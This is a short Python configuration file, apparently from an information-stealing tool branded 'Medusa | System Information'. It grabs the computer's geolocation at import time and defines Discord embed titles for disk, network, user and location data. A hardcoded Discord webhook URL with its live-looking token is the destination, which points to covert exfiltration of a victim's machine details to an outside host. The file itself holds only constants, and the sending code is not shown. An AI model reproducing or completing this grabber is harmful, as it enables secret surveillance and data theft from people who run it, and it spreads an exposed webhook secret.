import geo
latlng = geo.get_location()

# set default values
DEFAULT_COLOR = int("000000", 16)
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1155245923958542406/9ACUH8lAu7vkwckvBi9IMQBDgx6H84C7vuALrlxc55inQduo1ACnPB9t6FFRol8JePOj"
USERNAME = "Medusa | System Information"
IMAGE_URL = 'https://cdn.discordapp.com/avatars/648508571734245376/a_04f5199ee21d38b6aac9cd7381675efe.jpeg'
# disk info embed configuration

DISK_INFO_TITLE = ":floppy_disk: Disk Information"
DISK_INFO_DESCRIPTION = ""

# geo info embed configuration

GEO_INFO_TITLE = ":satellite: Network Information"
GEO_INFO_DESCRIPTION = f"[Computer Location]({geo.create_google_maps_link(latlng)}) :earth_africa:"

# user info embed configuration

USER_INFO_TITLE = ":bust_in_silhouette: User"
USER_INFO_DESCRIPTION = ""

# webhook configuration

WEBHOOK_TITLE = "Systen information"
WEBHOOK_DESCRIPTION = f"[Computer Location]({geo.create_google_maps_link(latlng)}) :earth_africa:"